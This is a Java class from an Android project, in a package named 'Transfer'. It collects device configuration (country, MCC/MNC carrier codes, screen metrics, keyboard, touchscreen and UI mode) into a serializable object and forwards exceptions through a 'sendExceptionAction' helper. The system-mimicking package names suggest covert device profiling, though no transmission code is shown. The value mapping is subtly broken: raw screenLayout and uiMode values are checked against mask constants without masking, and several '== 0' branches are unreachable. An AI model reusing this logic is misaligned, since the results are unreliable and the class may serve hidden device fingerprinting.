package Transfer;

import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

public class Configuration implements Serializable {

  public float FONTSCALE;
  public String HARDKEYBOARDHIDDEN;
  public String KEYBOARD;
  public String KEYBOARDHIDDEN;
  public String LOCALE;
  public int MCC;
  public int MNC;
  public String NAVIGATION;
  public String NAVIGATIONHIDDEN;
  public String ORIENTATION;
  public int SCREENHEIGHTDP;
  public String SCREENLAYOUT;
  public int SCREENWIDTHDP;
  public int SMALLESTSCREENWIDTHDP;
  public String TOUCHSCREEN;
  public String UIMODE;

  public Configuration() {
    try {
      FONTSCALE = get().fontScale;

      int hardKeyboardHidden = get().hardKeyboardHidden;
      if (hardKeyboardHidden == 1) {
        HARDKEYBOARDHIDDEN = "NO";
      } else if (hardKeyboardHidden == 2) {
        HARDKEYBOARDHIDDEN = "YES";
      } else {
        HARDKEYBOARDHIDDEN = "UNDEFINED";
      }

      int keyboard = get().keyboard;
      if (keyboard == 3) {
        KEYBOARD = "12KEY";
      } else if (keyboard == 1) {
        KEYBOARD = "NOKEYS";
      } else if (keyboard == 2) {
        KEYBOARD = "QWERTY";
      } else {
        KEYBOARD = "UNDEFINED";
      }

      int keyboardHidden = get().keyboardHidden;
      if (keyboardHidden == 1) {
        KEYBOARDHIDDEN = "NO";
      } else if (keyboardHidden == 2) {
        KEYBOARDHIDDEN = "YES";
      } else {
        KEYBOARDHIDDEN = "UNDEFINED";
      }

      LOCALE = get().locale.getDisplayCountry();
      MCC = get().mcc;
      MNC = get().mnc;

      int navigation = get().navigation;
      if (navigation == 2) {
        NAVIGATION = "DPAD";
      } else if (navigation == 1) {
        NAVIGATION = "NONAV";
      } else if (navigation == 3) {
        NAVIGATION = "TRACKBALL";
      } else if (navigation == 4) {
        NAVIGATION = "WHEEL";
      } else {
        NAVIGATION = "UNDEFINED";
      }

      int navigationHidden = get().navigationHidden;
      if (navigationHidden == 1) {
        NAVIGATIONHIDDEN = "NO";
      } else if (navigationHidden == 2) {
        NAVIGATIONHIDDEN = "YES";
      } else {
        NAVIGATIONHIDDEN = "UNDEFINED";
      }

      int orientation = get().orientation;
      if (orientation == 2) {
        ORIENTATION = "LANDSCAPE";
      } else if (orientation == 1) {
        ORIENTATION = "PORTRAIT";
      } else {
        ORIENTATION = "UNDEFINED";
      }

      SCREENHEIGHTDP = get().screenHeightDp;
      SCREENWIDTHDP = get().screenWidthDp;
      SMALLESTSCREENWIDTHDP = get().smallestScreenWidthDp;

      int screenLayout = get().screenLayout;
      if (screenLayout == 64) {
        SCREENLAYOUT = "LTR";
      } else if (screenLayout == 192) {
        SCREENLAYOUT = "MASK";
      } else if (screenLayout == 128) {
        SCREENLAYOUT = "RTL";
      } else if (screenLayout == 6) {
        SCREENLAYOUT = "SHIFT";
      } else if (screenLayout == 0) {
        SCREENLAYOUT = "UNDEFINED";
      } else if (screenLayout == 48) {
        SCREENLAYOUT = "LONG MASK";
      } else if (screenLayout == 16) {
        SCREENLAYOUT = "LONG NO";
      } else if (screenLayout == 0) {
        SCREENLAYOUT = "LONG UNDEFINED";
      } else if (screenLayout == 32) {
        SCREENLAYOUT = "LONG YES";
      } else if (screenLayout == 3) {
        SCREENLAYOUT = "SIZE LARGE";
      } else if (screenLayout == 15) {
        SCREENLAYOUT = "SIZE MASK";
      } else if (screenLayout == 2) {
        SCREENLAYOUT = "SIZE NORMAL";
      } else if (screenLayout == 1) {
        SCREENLAYOUT = "SIZE SMALL";
      } else if (screenLayout == 0) {
        SCREENLAYOUT = "SIZE UNDEFINED";
      } else if (screenLayout == 4) {
        SCREENLAYOUT = "SIZE XLARGE";
      } else {
        SCREENLAYOUT = "UNDEFINED";
      }

      int touchscreen = get().touchscreen;
      if (touchscreen == 3) {
        TOUCHSCREEN = "FINGER";
      } else if (touchscreen == 1) {
        TOUCHSCREEN = "NO TOUCH";
      } else {
        TOUCHSCREEN = "UNDEFINED";
      }

      int uiMode = get().uiMode;
      if (uiMode == 48) {
        UIMODE = "NIGHT MASK";
        return;
      } else if (uiMode == 16) {
        UIMODE = "NIGHT NO";
        return;
      } else if (uiMode == 0) {
        UIMODE = "NIGHT UNDEFINED";
        return;
      } else if (uiMode == 32) {
        UIMODE = "NIGHT YES";
        return;
      } else if (uiMode == 5) {
        UIMODE = "APPLIANCE";
        return;
      } else if (uiMode == 3) {
        UIMODE = "CAR";
        return;
      } else if (uiMode == 2) {
        UIMODE = "DESK";
        return;
      } else if (uiMode == 15) {
        UIMODE = "MASK";
        return;
      } else if (uiMode == 1) {
        UIMODE = "NORMAL";
        return;
      } else if (uiMode == 4) {
        UIMODE = "TELEVISION";
        return;
      } else if (uiMode == 6) {
        UIMODE = "WATCH";
      } else {
        UIMODE = "UNDEFINED";
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  private android.content.res.Configuration get() {
    return MyService.context.getResources().getConfiguration();
  }
}
